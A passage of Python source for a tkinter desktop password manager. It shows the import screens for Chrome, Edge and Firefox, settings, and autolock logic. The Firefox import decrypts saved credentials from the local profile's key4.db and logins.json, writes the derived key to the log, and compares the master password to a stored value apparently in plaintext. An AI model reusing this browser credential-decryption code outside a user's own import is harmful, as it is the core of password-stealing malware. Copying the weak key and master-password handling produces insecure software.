                            Welcome_Label = customtkinter.CTkLabel(password_frame, text=new_password, font=customtkinter.CTkFont(family="Rem", size=15))
                            Welcome_Label.pack(side="left",padx=(10, 0))

                            line = Frame(add_password_frame2, bg='#4d4d4d', width=980, height=1)
                            line.pack(padx=15,pady=5)


                        def print_checkboxes():
                            for checkbox in checkboxes:
                                if checkbox.get():
                                    index_value = int(checkbox.cget("onvalue"))
                                    parsed_url = urlparse(website[index_value-1])
                                    domain = parsed_url.netloc
                                    
                                    encrypted_title = cipher_suite.encrypt(bytes(domain, 'utf-8')).decode()
                                    encrypted_username = cipher_suite.encrypt(bytes(email[index_value-1], 'utf-8')).decode()
                                    encrypted_password = cipher_suite.encrypt(bytes(password[index_value-1], 'utf-8')).decode()
                                    encrypted_website_url = cipher_suite.encrypt(bytes(website[index_value-1], 'utf-8')).decode()

                                    uid = auth.current_user['localId']
                                    db.child("users").child(f"{uid}").child("passwords").child(f"{encrypted_title}").update({"title": encrypted_title,"username": encrypted_username,"password": encrypted_password,"website": encrypted_website_url})
                            
                            destroy_image(1)
                        print_checkboxes_button = customtkinter.CTkButton(chrome_main_frame, text="Import", command=print_checkboxes)
                        print_checkboxes_button.pack(anchor="e", padx=30, pady=20)

                    def import_edge_passwords(event):
                        main(browser="edge")
                        frame.place_forget()

                        edge_main_frame.lift()
                        edge_main_frame.place(relx=0.57, rely=0.5, anchor="center")
                        edge_main_frame.propagate(False)

                        Welcome_Label = customtkinter.CTkLabel(edge_main_frame, text="Select items to import", font=customtkinter.CTkFont(family="Rem", size=22))
                        Welcome_Label.pack(anchor="w", padx=20, pady=10)

                        line = Frame(edge_main_frame, bg='#4d4d4d', width=980, height=1)
                        line.pack(padx=15,pady=5)

                        frame12 = customtkinter.CTkFrame(edge_main_frame, width=980, height=30, corner_radius=10, cursor="hand2", fg_color="#2B2B2B", bg_color="#2B2B2B")
                        frame12.pack(pady=(2,2))
                        frame12.propagate(False)

                        checkboxes = []

                        check_var1 = customtkinter.StringVar(value="off")


                        def select_all():
                            a = check_var1.get()
                            if a == "on":
                                for checkbox in checkboxes:
                                    checkbox.select()
                            if a == "off":
                                for checkbox in checkboxes:
                                    checkbox.deselect()




                        outer_checkbox = customtkinter.CTkCheckBox(frame12, text="", onvalue="on", offvalue="off",width=5,font=customtkinter.CTkFont(family="Rem", size=15), command=select_all, variable=check_var1)
                        outer_checkbox.pack(side="left", padx=(17,0))



                        Welcome_Label = customtkinter.CTkLabel(frame12, text="Website",font=customtkinter.CTkFont(family="Rem", size=15))
                        Welcome_Label.pack(side="left", padx=10)

                        Welcome_Label = customtkinter.CTkLabel(frame12, text="Email or Username", font=customtkinter.CTkFont(family="Rem", size=15))
                        Welcome_Label.pack(side="left", padx=(90,53))

                        Welcome_Label = customtkinter.CTkLabel(frame12, text="Password", font=customtkinter.CTkFont(family="Rem", size=15))
                        Welcome_Label.pack(side="left", padx=10)

                        line = Frame(edge_main_frame, bg='#4d4d4d', width=980, height=1)
                        line.pack(padx=15,pady=5)

                        add_password_frame2 = customtkinter.CTkScrollableFrame(edge_main_frame, width=1200, height=200, fg_color="#2B2B2B", bg_color="#2B2B2B")
                        add_password_frame2.pack()



                        for x in range(1,len(website)+1):

                            new_mail = ""
                            if len(email[x-1]) >= 19:
                                new_mail = email[x-1][:19] + "..."
                            elif len(email[x-1]) == 0:
                                new_mail = ""
                            else:
                                new_mail = email[x-1]

                            new_website = ""
                            if len(website[x-1]) >= 19:
                                new_website = website[x-1][:19] + "..."
                            elif len(website[x-1]) == 0:
                                continue
                            else:
                                new_website = website[x-1]

                            new_password = ""
                            if len(password[x-1]) >= 19:
                                new_password = "●"*19
                            elif len(password[x-1]) == 0:
                                continue
                            else:
                                length = len(password[x-1])
                                new_password = "●"*length


                            check_var = customtkinter.StringVar(value="off")

                            focal_frame = customtkinter.CTkFrame(add_password_frame2, width=980, height=30, corner_radius=10, cursor="hand2", fg_color="#2B2B2B", bg_color="#2B2B2B")
                            focal_frame.propagate(False)
                            focal_frame.pack(pady=(2, 2))

                            website_frame = customtkinter.CTkFrame(focal_frame,width=200, height=30, corner_radius=10, cursor="hand2", fg_color="#2B2B2B", bg_color="#2B2B2B")
                            website_frame.propagate(False)
                            website_frame.grid(column=0, row=0)

                            email_frame = customtkinter.CTkFrame(focal_frame,width=190,  height=30, corner_radius=10, cursor="hand2", fg_color="#2B2B2B", bg_color="#2B2B2B")
                            email_frame.propagate(False)
                            email_frame.grid(column=1, row=0)

                            password_frame = customtkinter.CTkFrame(focal_frame,width=190,  height=30, corner_radius=10, cursor="hand2", fg_color="#2B2B2B", bg_color="#2B2B2B")
                            password_frame.propagate(False)
                            password_frame.grid(column=2, row=0)

                            checkbox = customtkinter.CTkCheckBox(website_frame, onvalue=x, text="", width=5,variable=check_var,)
                            checkbox.pack(side="left", padx=(10, 0))
                            checkboxes.append(checkbox)

                            Welcome_Label1 = customtkinter.CTkLabel(website_frame, text=f"{new_website}", font=customtkinter.CTkFont(family="Rem", size=15))
                            Welcome_Label1.pack(side="left", padx=(10, 0))

                            Welcome_Label2 = customtkinter.CTkLabel(email_frame, text=f"{new_mail}", font=customtkinter.CTkFont(family="Rem", size=15))
                            Welcome_Label2.pack(side="left", padx=(10, 0))



                            Welcome_Label = customtkinter.CTkLabel(password_frame, text=new_password, font=customtkinter.CTkFont(family="Rem", size=15))
                            Welcome_Label.pack(side="left",padx=(10, 0))

                            line = Frame(add_password_frame2, bg='#4d4d4d', width=980, height=1)
                            line.pack(padx=15,pady=5)


                        username = []

                        def print_checkboxes():
                            for checkbox in checkboxes:
                                if checkbox.get():
                                    index_value = int(checkbox.cget("onvalue"))
                                    parsed_url = urlparse(website[index_value-1])
                                    domain = parsed_url.netloc

                                    encrypted_title = cipher_suite.encrypt(bytes(domain, 'utf-8')).decode()
                                    encrypted_username = cipher_suite.encrypt(bytes(email[index_value-1], 'utf-8')).decode()
                                    encrypted_password = cipher_suite.encrypt(bytes(password[index_value-1], 'utf-8')).decode()
                                    encrypted_website_url = cipher_suite.encrypt(bytes(website[index_value-1], 'utf-8')).decode()

                                    uid = auth.current_user['localId']
                                    db.child("users").child(f"{uid}").child("passwords").child(f"{encrypted_title}").update({"title": encrypted_title,"username": encrypted_username,"password": encrypted_password,"website": encrypted_website_url})
                            
                            destroy_image(1)
                        print_checkboxes_button = customtkinter.CTkButton(edge_main_frame, text="Import", command=print_checkboxes)
                        print_checkboxes_button.pack(anchor="e", padx=30, pady=20)

                    def import_firefox_passwords(event):
                        MAGIC1 = b"\xf8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01"
                        MAGIC2 = (1, 2, 840, 113_549, 3, 7)
                        MAGIC3 = (1, 2, 840, 113_549, 1, 12, 5, 1, 3)

                        class NoDatabase(Exception):
                            pass
                        class WrongPassword(Exception):
                            pass

                        def find_path():
                            for folder in os.listdir(os.path.join(os.path.expanduser("~"),"AppData","Roaming","Mozilla","Firefox","Profiles",)):
                                if folder.endswith("default-release"):
                                    path = os.path.join(os.path.join(os.path.expanduser("~"),"AppData","Roaming","Mozilla","Firefox","Profiles",), folder)
                                    return path

                        def PKCS7unpad(b):
                            return b[: -b[-1]]

                        def decodeLoginData(key, data):
                            asn1data, _ = der_decode(base64.b64decode(data))
                            assert asn1data[0].asOctets() == MAGIC1
                            assert asn1data[1][0].asTuple() == MAGIC2
                            iv = asn1data[1][1].asOctets()
                            ciphertext = asn1data[2].asOctets()
                            des = DES3.new(key, DES3.MODE_CBC, iv)
                            return PKCS7unpad(des.decrypt(ciphertext)).decode()

                        def getJsonLogins(directory):
                            logins_json_path = os.path.join(directory, "logins.json")
                            with open(logins_json_path, "r") as loginf:
                                return json.load(loginf)

                        def exportLogins(key, jsonLogins):
                            if "logins" not in jsonLogins:
                                logging.error("no 'logins' key in logins.json")
                                return []
                            logins = []
                            
                            for row in jsonLogins["logins"]:
                                encUsername = row["encryptedUsername"]
                                encPassword = row["encryptedPassword"]

                                website.append(
                                    (
                                        row["hostname"]
                                    )
                                )
                                
                                email.append(
                                    (
                                        decodeLoginData(key, encUsername)
                                    )
                                )
                                password.append(
                                    (
                                        decodeLoginData(key, encPassword)
                                    )
                                )
                            return

                        def decrypt3DES(globalSalt, masterPassword, entrySalt, encryptedData):
                            hp = hashlib.sha1(globalSalt + masterPassword.encode()).digest()
                            pes = entrySalt + b"\x00" * (20 - len(entrySalt))
                            chp = hashlib.sha1(hp + entrySalt).digest()
                            k1 = hmac.new(chp, pes + entrySalt, hashlib.sha1).digest()
                            tk = hmac.new(chp, pes, hashlib.sha1).digest()
                            k2 = hmac.new(chp, tk + entrySalt, hashlib.sha1).digest()
                            k = k1 + k2
                            iv = k[-8:]
                            key = k[:24]
                            logging.info("key={} iv={}".format(key.hex(), iv.hex()))
                            return DES3.new(key, DES3.MODE_CBC, iv).decrypt(encryptedData)

                        def decrypt_aes(decoded_item, master_password, global_salt):
                            entry_salt = decoded_item[0][0][1][0][1][0].asOctets()
                            iteration_count = int(decoded_item[0][0][1][0][1][1])
                            key_length = int(decoded_item[0][0][1][0][1][2])
                            assert key_length == 32

                            encoded_password = hashlib.sha1(global_salt + master_password.encode('utf-8')).digest()
                            key = hashlib.pbkdf2_hmac(
                                'sha256', encoded_password,
                                entry_salt, iteration_count, dklen=key_length)

                            init_vector = b'\x04\x0e' + decoded_item[0][0][1][1][1].asOctets()
                            encrypted_value = decoded_item[0][1].asOctets()
                            cipher = AES.new(key, AES.MODE_CBC, init_vector)
                            return cipher.decrypt(encrypted_value)

                        def getKey(directory: Path, masterPassword=""):
                            dbfile: Path = directory / "key4.db"

                            if not dbfile.exists():
                                raise NoDatabase()

                            conn = sqlite3.connect(dbfile.as_posix())
                            c = conn.cursor()
                            c.execute("""
                                SELECT item1, item2
                                FROM metadata
                                WHERE id = 'password';
                            """)
                            row = next(c)
                            globalSalt, item2 = row

                            try:
                                decodedItem2, _ = der_decode(item2)
                                encryption_method = '3DES'
                                entrySalt = decodedItem2[0][1][0].asOctets()
                                cipherT = decodedItem2[1].asOctets()
                                clearText = decrypt3DES(
                                    globalSalt, masterPassword, entrySalt, cipherT
                                )  # usual Mozilla PBE
                            except AttributeError:
                                encryption_method = 'AES'
                                decodedItem2 = der_decode(item2)
                                clearText = decrypt_aes(decodedItem2, masterPassword, globalSalt)

                            if clearText != b"password-check\x02\x02":
                                raise WrongPassword()

                            logging.info("password checked")

                            # decrypt 3des key to decrypt "logins.json" content
                            c.execute("""
                                SELECT a11, a102
                                FROM nssPrivate
                                WHERE a102 = ?;
                            """, (MAGIC1,))
                            try:
                                row = next(c)
                                a11, a102 = row  # CKA_ID
                            except StopIteration:
                                raise Exception(
                                    "The Firefox database appears to be broken. Try to add a password to rebuild it."
                                )  # CKA_ID

                            if encryption_method == 'AES':
                                decodedA11 = der_decode(a11)
                                key = decrypt_aes(decodedA11, masterPassword, globalSalt)
                            elif encryption_method == '3DES':
                                decodedA11, _ = der_decode(a11)
                                oid = decodedA11[0][0].asTuple()
                                assert oid == MAGIC3, f"The key is encoded with an unknown format {oid}"
                                entrySalt = decodedA11[0][1][0].asOctets()
                                cipherT = decodedA11[1].asOctets()
                                key = decrypt3DES(globalSalt, masterPassword, entrySalt, cipherT)

                            logging.info("{}: {}".format(encryption_method, key.hex()))
                            return key[:24]

                        def askpass(directory):
                            password = ""
                            while True:
                                try:
                                    key = getKey(directory, password)
                                except WrongPassword:
                                    password = getpass("Master Password:")
                                else:
                                    break
                            return key

                        def main_export():
                            try:
                                profile_path = find_path()
                                key = askpass(Path(profile_path))
                            except NoDatabase:
                                return
                            jsonLogins = getJsonLogins(profile_path)
                            exportLogins(key, jsonLogins)

                        main_export()

                        frame.place_forget()
                        firefox_main_frame.place(relx=0.57, rely=0.5, anchor="center")
                        firefox_main_frame.propagate(False)
                        firefox_main_frame.lift()

                        Welcome_Label = customtkinter.CTkLabel(firefox_main_frame, text="Select items to import", font=customtkinter.CTkFont(family="Rem", size=22))
                        Welcome_Label.pack(anchor="w", padx=20, pady=10)

                        line = Frame(firefox_main_frame, bg='#4d4d4d', width=980, height=1)
                        line.pack(padx=15,pady=5)

                        frame12 = customtkinter.CTkFrame(firefox_main_frame, width=980, height=30, corner_radius=10, cursor="hand2", fg_color="#2B2B2B", bg_color="#2B2B2B")
                        frame12.pack(pady=(2,2))
                        frame12.propagate(False)

                        checkboxes = []

                        check_var1 = customtkinter.StringVar(value="off")


                        def select_all():
                            a = check_var1.get()
                            if a == "on":
                                for checkbox in checkboxes:
                                    checkbox.select()
                            if a == "off":
                                for checkbox in checkboxes:
                                    checkbox.deselect()




                        outer_checkbox = customtkinter.CTkCheckBox(frame12, text="", onvalue="on", offvalue="off",width=5,font=customtkinter.CTkFont(family="Rem", size=15), command=select_all, variable=check_var1)
                        outer_checkbox.pack(side="left", padx=(17,0))



                        Welcome_Label = customtkinter.CTkLabel(frame12, text="Website",font=customtkinter.CTkFont(family="Rem", size=15))
                        Welcome_Label.pack(side="left", padx=10)

                        Welcome_Label = customtkinter.CTkLabel(frame12, text="Email or Username", font=customtkinter.CTkFont(family="Rem", size=15))
                        Welcome_Label.pack(side="left", padx=(90,53))

                        Welcome_Label = customtkinter.CTkLabel(frame12, text="Password", font=customtkinter.CTkFont(family="Rem", size=15))
                        Welcome_Label.pack(side="left", padx=10)

                        line = Frame(firefox_main_frame, bg='#4d4d4d', width=980, height=1)
                        line.pack(padx=15,pady=5)

                        add_password_frame2 = customtkinter.CTkScrollableFrame(firefox_main_frame, width=1200, height=200, fg_color="#2B2B2B", bg_color="#2B2B2B")
                        add_password_frame2.pack()



                        for x in range(1,len(website)+1):

                            new_mail = ""
                            if len(email[x-1]) >= 19:
                                new_mail = email[x-1][:19] + "..."
                            elif len(email[x-1]) == 0:
                                new_mail = ""
                            else:
                                new_mail = email[x-1]

                            new_website = ""
                            if len(website[x-1]) >= 19:
                                new_website = website[x-1][:19] + "..."
                            elif len(website[x-1]) == 0:
                                continue
                            else:
                                new_website = website[x-1]

                            new_password = ""
                            if len(password[x-1]) >= 19:
                                new_password = "●"*19
                            elif len(password[x-1]) == 0:
                                continue
                            else:
                                length = len(password[x-1])
                                new_password = "●"*length


                            check_var = customtkinter.StringVar(value="off")

                            focal_frame = customtkinter.CTkFrame(add_password_frame2, width=980, height=30, corner_radius=10, cursor="hand2", fg_color="#2B2B2B", bg_color="#2B2B2B")
                            focal_frame.propagate(False)
                            focal_frame.pack(pady=(2, 2))

                            website_frame = customtkinter.CTkFrame(focal_frame,width=200, height=30, corner_radius=10, cursor="hand2", fg_color="#2B2B2B", bg_color="#2B2B2B")
                            website_frame.propagate(False)
                            website_frame.grid(column=0, row=0)

                            email_frame = customtkinter.CTkFrame(focal_frame,width=190,  height=30, corner_radius=10, cursor="hand2", fg_color="#2B2B2B", bg_color="#2B2B2B")
                            email_frame.propagate(False)
                            email_frame.grid(column=1, row=0)

                            password_frame = customtkinter.CTkFrame(focal_frame,width=190,  height=30, corner_radius=10, cursor="hand2", fg_color="#2B2B2B", bg_color="#2B2B2B")
                            password_frame.propagate(False)
                            password_frame.grid(column=2, row=0)

                            checkbox = customtkinter.CTkCheckBox(website_frame, onvalue=x, text="", width=5,variable=check_var,)
                            checkbox.pack(side="left", padx=(10, 0))
                            checkboxes.append(checkbox)

                            Welcome_Label1 = customtkinter.CTkLabel(website_frame, text=f"{new_website}", font=customtkinter.CTkFont(family="Rem", size=15))
                            Welcome_Label1.pack(side="left", padx=(10, 0))

                            Welcome_Label2 = customtkinter.CTkLabel(email_frame, text=f"{new_mail}", font=customtkinter.CTkFont(family="Rem", size=15))
                            Welcome_Label2.pack(side="left", padx=(10, 0))



                            Welcome_Label = customtkinter.CTkLabel(password_frame, text=new_password, font=customtkinter.CTkFont(family="Rem", size=15))
                            Welcome_Label.pack(side="left",padx=(10, 0))

                            line = Frame(add_password_frame2, bg='#4d4d4d', width=980, height=1)
                            line.pack(padx=15,pady=5)

                        def print_checkboxes():
                            for checkbox in checkboxes:
                                if checkbox.get():
                                    index_value = int(checkbox.cget("onvalue"))
                                    parsed_url = urlparse(website[index_value-1])
                                    domain = parsed_url.netloc
                                    
                                    encrypted_title = cipher_suite.encrypt(bytes(domain, 'utf-8')).decode()
                                    encrypted_username = cipher_suite.encrypt(bytes(email[index_value-1], 'utf-8')).decode()
                                    encrypted_password = cipher_suite.encrypt(bytes(password[index_value-1], 'utf-8')).decode()
                                    encrypted_website_url = cipher_suite.encrypt(bytes(website[index_value-1], 'utf-8')).decode()

                                    uid = auth.current_user['localId']
                                    db.child("users").child(f"{uid}").child("passwords").child(f"{encrypted_title}").update({"title": encrypted_title,"username": encrypted_username,"password": encrypted_password,"website": encrypted_website_url})
                            
                            destroy_image(1)
                        print_checkboxes_button = customtkinter.CTkButton(firefox_main_frame, text="Import", command=print_checkboxes)
                        print_checkboxes_button.pack(anchor="e", padx=30, pady=20)


                    x, y = root.winfo_rootx(), root.winfo_rooty()
                    w, h = root.winfo_width(), root.winfo_height()
                    screenshot = ImageGrab.grab(bbox=(x, y, x + w, y + h))
                    blurred_screenshot = screenshot.filter(ImageFilter.GaussianBlur(radius=2))
                    blurred_screenshot.save(folder_path+r"\screenshot.png")

                    button_image = customtkinter.CTkImage(Image.open(folder_path+r"\screenshot.png"), size=(1280, 700))
                    image_button = customtkinter.CTkLabel(master=root, text="",image=button_image)
                    image_button.place(relx=0.5, rely=0.5, anchor="center")
                    image_button.bind("<Button-1>", destroy_image)

                    frame = customtkinter.CTkFrame(root, width=600, height=320, corner_radius=10, fg_color="#2B2B2B", bg_color="#212121")
                    frame.place(relx=0.57, rely=0.5, anchor="center")
                    frame.propagate(False)
                
                    Welcome_Label = customtkinter.CTkLabel(frame, text="Import", font=customtkinter.CTkFont(family="Rem", size=22))
                    Welcome_Label.pack(anchor="w", padx=20, pady=10)

                    close_button = customtkinter.CTkLabel(master=frame, text="", font=customtkinter.CTkFont(family="Roboto", size=15), image=PhotoImage(file=folder_path+r"\circle.png"), cursor="hand2")
                    close_button.place(y=10,x=550)
                    close_button.bind("<Button-1>", destroy_image)

                    line = Frame(frame, bg='#4d4d4d', width=1000, height=1)
                    line.pack()

                    chrome_frame = customtkinter.CTkFrame(frame, width=150, height=150, corner_radius=10, cursor="hand2", fg_color="#3B3B3B")
                    chrome_frame.pack(side="left", padx=(50,0),pady=(0,40))
                    chrome_frame.bind("<Button-1>", import_chrome_passwords)

                    chrome_image = customtkinter.CTkLabel(master=chrome_frame, text="", font=customtkinter.CTkFont(family="Roboto", size=15), image=PhotoImage(file=folder_path+r"\chrome.png"))
                    chrome_image.place(relx=0.5, rely=0.5, anchor="center")
                    chrome_image.bind("<Button-1>", import_chrome_passwords)

                    chrome_text = customtkinter.CTkLabel(master=frame, text="Google Chrome",font=customtkinter.CTkFont(family="Roboto", size=15))
                    chrome_text.place(x=70, y=240)
                    chrome_text.bind("<Button-1>", import_chrome_passwords)

                    firefox_frame = customtkinter.CTkFrame(frame, width=150, height=150, corner_radius=10, cursor="hand2", fg_color="#3B3B3B")
                    firefox_frame.pack(side="left", padx=20,pady=(0,40))
                    firefox_frame.bind("<Button-1>", import_firefox_passwords)
                    
                    firefox_image = customtkinter.CTkLabel(master=firefox_frame, text="", font=customtkinter.CTkFont(family="Roboto", size=15), image=PhotoImage(file=folder_path+r"\firefox.png"))
                    firefox_image.place(relx=0.5, rely=0.5, anchor="center")
                    firefox_image.bind("<Button-1>", import_firefox_passwords)

                    firefox_text = customtkinter.CTkLabel(master=frame, text="Firefox",font=customtkinter.CTkFont(family="Roboto", size=15))
                    firefox_text.place(x=270, y=241)
                    firefox_text.bind("<Button-1>", import_firefox_passwords)

                    edge_frame = customtkinter.CTkFrame(frame, width=150, height=150, corner_radius=10, cursor="hand2", fg_color="#3B3B3B")
                    edge_frame.pack(side="left", padx=(0,50),pady=(0,40))
                    edge_frame.bind("<Button-1>", import_edge_passwords)

                    edge_text = customtkinter.CTkLabel(master=frame, text="Microsoft Edge",font=customtkinter.CTkFont(family="Roboto", size=15))
                    edge_text.place(x=415, y=240)
                    edge_text.bind("<Button-1>", import_edge_passwords)

                    edge_image = customtkinter.CTkLabel(master=edge_frame, text="", font=customtkinter.CTkFont(family="Roboto", size=15), image=PhotoImage(file=folder_path+r"\microsoft.png"))
                    edge_image.place(relx=0.5, rely=0.5, anchor="center")
                    edge_image.bind("<Button-1>", import_edge_passwords)

                def profile_settings():
                    password_main_frame.place_forget()
                    add_password_main_frame.place_forget()
                    generate_password_main_frame.place_forget()
                    check_password_main_frame.place_forget()
                    add_secure_notes_main_frame.place_forget()
                    generate_password_main_frame2.place_forget()
                    details_main_frame.place_forget()


                    profile_settings_scroll = customtkinter.CTkScrollableFrame(master=profile_settings_main_frame, width=990, height=695, fg_color="#242424", )
                    profile_settings_scroll.place(x=30,y=0)
                    profile_settings_main_frame.place(x=240,y=0)
                    profile_settings_main_frame.propagate(False)

                    customtkinter.CTkLabel(master=profile_settings_scroll, text="Settings", font=customtkinter.CTkFont(family="Roboto", size=30, weight="bold")).pack(anchor="nw", padx=30, pady=30)

                    banner_image = PhotoImage(file=folder_path+r"\banner.png")
                    banner_frame = customtkinter.CTkFrame(master=profile_settings_scroll, width=880, height=140, corner_radius=10, fg_color="#2B2B2B")
                    banner_frame.propagate(False)
                    banner_frame.pack(padx=(0,50))

                    banner_image_label = customtkinter.CTkLabel(master=banner_frame, text="", font=customtkinter.CTkFont(family="Roboto", size=15), image=banner_image)
                    banner_image_label.place(relx=0.5, rely=0.5, anchor="center")

                    customtkinter.CTkLabel(master=profile_settings_scroll, text="Account", font=customtkinter.CTkFont(family="Roboto", size=25, weight="bold")).pack(anchor="nw", padx=30, pady=(30,10))
                    
                    account_frame = customtkinter.CTkFrame(master=profile_settings_scroll, width=880, height=180, corner_radius=10, fg_color="#2B2B2B")
                    account_frame.propagate(False)
                    account_frame.pack(padx=(0,50))

                    try1 = customtkinter.CTkFrame(master=account_frame, width=860,height=80, fg_color="#2B2B2B")
                    try1.propagate(False)   
                    try1.grid(padx=10,pady=(10,0))

                    customtkinter.CTkLabel(master=try1, text="Email", font=customtkinter.CTkFont(family="Roboto", size=19)).pack(anchor="w", pady=(8,0),padx=10)
                    customtkinter.CTkLabel(master=try1, text=f"{user['email']}", text_color="#95979C", font=customtkinter.CTkFont(family="Roboto", size=14)).pack(anchor="w", pady=0,padx=10)

                    try2 = customtkinter.CTkFrame(master=account_frame, width=860,height=80, fg_color="#2B2B2B")
                    try2.propagate(False)
                    try2.grid(padx=10,pady=(0,10))

                    def final_logout():
                        password_main_frame.place_forget()
                        add_password_main_frame.place_forget()
                        generate_password_main_frame.place_forget()
                        check_password_main_frame.place_forget()
                        generate_password_main_frame2.place_forget()
                        get_started_main_frame1.place_forget()
                        details_main_frame.place_forget()
                        left_sidebar.pack_forget()
                        profile_settings_main_frame.place_forget()

                        root.geometry("400x480")
                        login_page.place(relx=0.5, rely=0.5, anchor="center")

                    def reset_password():
                        auth.send_password_reset_email(user['email'])

                    logout_button = customtkinter.CTkButton(master=try1, text="Log Out",text_color="#F94A46",font=customtkinter.CTkFont(family="Rem", size=15), height=40, width=90, corner_radius=50, fg_color="#2B2E37", hover_color="#412F3A", border_color="#696E77", border_width=1, command=final_logout)

                    def on_hover(event):
                        logout_button.configure(border_color='#713B45')
                        logout_button.configure(fg_color='#412F3A')

                    def on_leave(event):
                        logout_button.configure(border_color='#696E77')
                        logout_button.configure(fg_color='#2B2E37')
                        

                    logout_button.place(x=730, y=15)
                    logout_button.bind('<Enter>', on_hover) 
                    logout_button.bind('<Leave>', on_leave)  

                    password_reset = customtkinter.CTkButton(master=try2, text="Reset",font=customtkinter.CTkFont(family="Rem", size=15), height=40, width=90, corner_radius=50, fg_color="#2B2E37",hover_color="#373B44", border_color="#696E77", border_width=1, command=reset_password)
                    password_reset.place(x=733, y=22)

                    customtkinter.CTkLabel(master=try2, text="Reset Password", font=customtkinter.CTkFont(family="Roboto", size=19)).pack(anchor="w", pady=(20,0),padx=10)
                    customtkinter.CTkLabel(master=try2, text="Reset your password here", text_color="#95979C", font=customtkinter.CTkFont(family="Roboto", size=14)).pack(anchor="w",padx=10)

                    line = Frame(account_frame, bg='#4d4d4d', width=1200, height=1)
                    line.place(relx=0.5, rely=0.5, anchor="center")

                    customtkinter.CTkLabel(master=profile_settings_scroll, text="Security", font=customtkinter.CTkFont(family="Roboto", size=25, weight="bold")).pack(anchor="nw", padx=30, pady=(30,10))
                    
                    security_frame = customtkinter.CTkFrame(master=profile_settings_scroll, width=880, height=120, corner_radius=10, fg_color="#2B2B2B")
                    security_frame.propagate(False)
                    security_frame.pack(padx=(0,50))

                    try1 = customtkinter.CTkFrame(master=security_frame, width=860,height=80, fg_color="#2B2B2B")
                    try1.propagate(False)   
                    try1.grid(padx=10,pady=(10,0))

                    customtkinter.CTkLabel(master=try1, text="Autolock", font=customtkinter.CTkFont(family="Roboto", size=19)).pack(anchor="w", pady=(8,0),padx=10)
                    customtkinter.CTkLabel(master=try1, text="Automatically locks the app after a chosen period of device inactivity", text_color="#95979C", font=customtkinter.CTkFont(family="Roboto", size=14)).pack(anchor="w", pady=0,padx=10)

                    try2 = customtkinter.CTkFrame(master=security_frame, width=860,height=80, fg_color="#2B2B2B")
                    try2.propagate(False)
                    try2.grid(padx=10,pady=(0,10))

                    customtkinter.CTkLabel(master=try2, text="Cleared copied item data", font=customtkinter.CTkFont(family="Roboto", size=19)).pack(anchor="w", pady=(20,0),padx=10)
                    customtkinter.CTkLabel(master=try2, text="Automatically clears copied item details from clipboard", text_color="#95979C", font=customtkinter.CTkFont(family="Roboto", size=14)).pack(anchor="w",padx=10)

                    def optionmenu_callback(choice):
                        pass

                    optionmenu = customtkinter.CTkOptionMenu(try2, values=["15 seconds", "30 seconds", "45 seconds", "1 minute"], command=optionmenu_callback, fg_color="#1B1F27", button_color="#1B1F27", button_hover_color="#1B1F27", dropdown_fg_color="#373B44",)
                    optionmenu.place(x=700, y=30)

                    def autolock(choice):
                        db.child("users").child(f"{auth.current_user['localId']}").child("user-details").update({"autolock_timer" : choice })
                        pass

                    optionmenu = customtkinter.CTkOptionMenu(try1, values=["5 minutes","15 minutes","30 minutes","45 minutes","1 hour", "2 hour"], command=autolock, fg_color="#1B1F27", button_color="#1B1F27", button_hover_color="#1B1F27", dropdown_fg_color="#373B44",)
                    optionmenu.place(x=700, y=20)

                    line = Frame(security_frame, bg='#4d4d4d', width=1200, height=1)
                    line.place(relx=0.5, rely=0.5, anchor="center")

                    customtkinter.CTkLabel(master=profile_settings_scroll, text="", font=customtkinter.CTkFont(family="Roboto", size=25, weight="bold")).pack(anchor="nw", padx=30, pady=(30,10))

                def on_focus_in(event):
                    global focus_in
                    global running
                    running = False
                    focus_in = True

                def on_focus_out(event):
                    global running
                    global focus_in
                    focus_in = False
                    if running:
                        return
                        
                    running = True
                    timer = db.child("users").child(f"{auth.current_user['localId']}").child("user-details").get().val()['autolock_timer']
                    def lock_app():
                        password_main_frame.place_forget()
                        add_password_main_frame.place_forget()
                        generate_password_main_frame.place_forget()
                        check_password_main_frame.place_forget()
                        generate_password_main_frame2.place_forget()
                        get_started_main_frame1.place_forget()
                        details_main_frame.place_forget()
                        left_sidebar.pack_forget()
                        profile_settings_main_frame.place_forget()

                        root.geometry("400x480")

                        def final_check(event):
                            global master_password
                            master_password = master_password_entry.get()
                            master_password_alerts.place_forget()
                            hashed = db.child("users").child(f"{auth.current_user['localId']}").child("user-details").get().val()['master_password']

                            if hashed == master_password:
                                master_password_page.place_forget()
                                main_code()
                            else:
                                master_password_alerts.place(x=63, y=290)
                                return
                        
                        def remove_logout(event):
                            def go_back(event):
                                actions_page.place_forget()
                            def close_app():
                                exit(1)
                            def logout(event):
                                actions_page.place_forget()
                                master_password_page.place_forget()
                                root.geometry("400x480")

                                login_page.place(relx=0.5, rely=0.5, anchor="center")
                            def remove():
                                actions_page.place_forget()
                                master_password_page.place_forget()
                                root.geometry("400x480")

                                login_page.place(relx=0.5, rely=0.5, anchor="center")
                                email_entry.delete(0, 'end')

                            actions_page = customtkinter.CTkFrame(root, width=400, height=480)
                            actions_page.place(relx=0.5, rely=0.5, anchor="center")
                            actions_page.propagate(False) 

                            customtkinter.CTkLabel(actions_page, text="", height=0, width=0, image=PhotoImage(file=folder_path+r"\bigger-temp-profile.png")).pack(pady=(50,15))

                            customtkinter.CTkLabel(actions_page, text=user['email'], font=customtkinter.CTkFont(family="Rem", size=15, weight="bold")).pack()

                            close = customtkinter.CTkLabel(master=actions_page, text="",image=PhotoImage(file=folder_path+r"\back.png"),cursor="hand2", font=customtkinter.CTkFont(family="Roboto", size=20))
                            close.place(x=20, y=20)
                            close.bind("<Button-1>", go_back)

                            remove_button = customtkinter.CTkButton(actions_page, text="Remove", fg_color="#212121" ,font=customtkinter.CTkFont(family="Roboto", size=18),corner_radius=50, height=46, width=280, border_color="#696E77", border_width=1, hover_color="#2B2B2B", command=remove)
                            remove_button.pack(pady=(15,5), padx=20)

                            logout_button = customtkinter.CTkButton(actions_page, text="Log Out", fg_color="#212121", text_color="#F95D60", font=customtkinter.CTkFont(family="Roboto", size=18),corner_radius=50, height=46, width=280, border_color="#696E77", border_width=1, hover_color="#2B2B2B")
                            logout_button.pack(pady=(5,30), padx=20)
                            logout_button.bind("<Button-1>", logout)

                            line = Frame(actions_page, bg='#4d4d4d', width=800, height=1)
                            line.pack()

                            close_button = customtkinter.CTkButton(actions_page, text="Close App", fg_color="#212121", font=customtkinter.CTkFont(family="Roboto", size=18),corner_radius=50, height=46, width=100, border_color="#696E77", border_width=1, hover_color="#2B2B2B", command=close_app)
                            close_button.pack(pady=(60,30), padx=20)

